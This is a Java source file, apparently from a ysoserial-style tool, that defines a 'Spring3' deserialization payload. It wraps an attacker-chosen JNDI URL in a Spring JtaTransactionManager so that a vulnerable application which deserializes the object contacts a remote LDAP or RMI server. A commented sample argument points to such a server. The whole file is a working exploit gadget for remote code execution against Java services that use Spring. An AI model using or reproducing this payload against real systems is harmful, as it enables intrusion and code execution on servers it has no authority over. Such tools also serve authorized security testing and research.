package cn.butler.yso.payloads;

import cn.butler.payloads.ObjectPayload;
import cn.butler.payloads.PayloadRunner;
import cn.butler.thirdparty.payloads.custom.CommandConstant;
import cn.butler.yso.payloads.custom.CustomCommand;
import cn.butler.payloads.annotation.Authors;
import cn.butler.payloads.annotation.Dependencies;
import org.springframework.transaction.jta.JtaTransactionManager;


/**
 * Spring-tx JtxTransactionManager JNDI Injection
 *
 * @author wh1t3P1g
 * @since 2020/2/5
 */
@Dependencies({"org.springframework:spring-tx:5.2.3.RELEASE","org.springframework:spring-context:5.2.3.RELEASE","javax.transaction:javax.transaction-api:1.2"})
@Authors({ Authors.WH1T3P1G })
public class Spring3 extends PayloadRunner implements ObjectPayload<Object> {

    @Override
    public Object getObject(String command) throws Exception {
        String jndiURL = null;
        if(command.toLowerCase().startsWith(CommandConstant.COMMAND_JNDI)){
            jndiURL = command.substring(CommandConstant.COMMAND_JNDI.length());
        }else{
            throw new Exception(String.format("Command [%s] not supported",command));
        }

        JtaTransactionManager manager = new JtaTransactionManager();
        manager.setUserTransactionName(jndiURL);
        return manager;
    }

    public static void main(String[] args) throws Exception {
        //args = new String[]{"jndi:ldap://127.0.0.1:1664/obj"};
        PayloadRunner.run(Spring3.class, args);
    }
}
